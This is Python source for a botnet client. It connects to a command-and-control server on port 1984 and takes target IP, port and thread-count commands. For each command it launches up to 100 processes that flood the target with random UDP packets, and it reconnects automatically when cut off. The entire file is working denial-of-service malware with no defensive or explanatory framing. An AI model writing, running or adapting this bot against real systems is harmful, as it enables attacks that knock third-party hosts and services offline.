#!/usr/bin/env python3

import sys, socket, time, random
# from threading import Thread
from multiprocessing import Process


HOST = '127.0.0.1' # C&C IP
PORT = 1984 # default port


class NF_UDP_Flood:
    def __init__(self):
        self.procs = []

    @classmethod
    def udp_flood(cls, ip, port, packet_size = 1024):
        data = random._urandom(packet_size)
        addr = (ip, port)
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # `SOCK_DGRAM` = UDP
                for _ in range(1000):
                    sock.sendto(data, addr)
                    time.sleep(0.001) # 1ms
                print('UDP Sent ', flush=True)
            except Exception as e:
                print('[!] Error', e, flush=True)
            sock.close()


    def start(self, ip, port, threads):
        if threads <= 0:   threads = 1
        if threads >= 100: threads = 100
        print('\n[*] Flooder started!\n')
        self.stop()
        for _ in range(threads):
            proc = Process(target=self.udp_flood, args=(ip, port))
            self.procs.append(proc)
        for proc in self.procs:
            proc.start()
    

    def stop(self):
        if len(self.procs) == 0:
            return
        try:
            for proc in self.procs:
                proc.kill()
        except Exception as e:
            print('stop()', e)
        self.procs = []
        print('\n[*] Flooder stopped.\n')



class NF_Bot():

    def __init__(self):
        self.flooder = NF_UDP_Flood()

    def _connect(self):
        print ('[*] Connecting to the C&C server...')
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # sock.settimeout(10)
        sock.connect((HOST, PORT))
        print('[+] Connected to the server!')

        while True:
            try:
                data = sock.recv(1024)
                if not data:
                    break
                print('Receive: ', data.decode())
                data = data.decode()
                if not ':' in data:
                    continue
                ip, port, threads = data.split(':')
                print()
                print('='*50)
                print(f'ATTACK IP={ip}, Port={port}, Threads={threads}')
                print('='*50)
                self.flooder.start(ip, int(port), int(threads))
            except Exception as e:
                print('connect err', e)
                pass
        sock.close()
        print('[-] Disconnected from server.')

    def main(self):
        while True:
            try:
                self._connect()
            except ConnectionRefusedError:
                pass # C&C server is not running.
            except Exception as e:
                print(e)
                print()
            
            try:
                self.flooder.stop()
                print('[*] Reconnect after 3-10 seconds...')
                time.sleep(random.random() * 7 + 3)
            except:
                sys.exit()
                # break
        self.flooder.stop()


if __name__ == '__main__':
    bot = NF_Bot()

    try:
        bot.main()
    except KeyboardInterrupt:
        sys.exit()

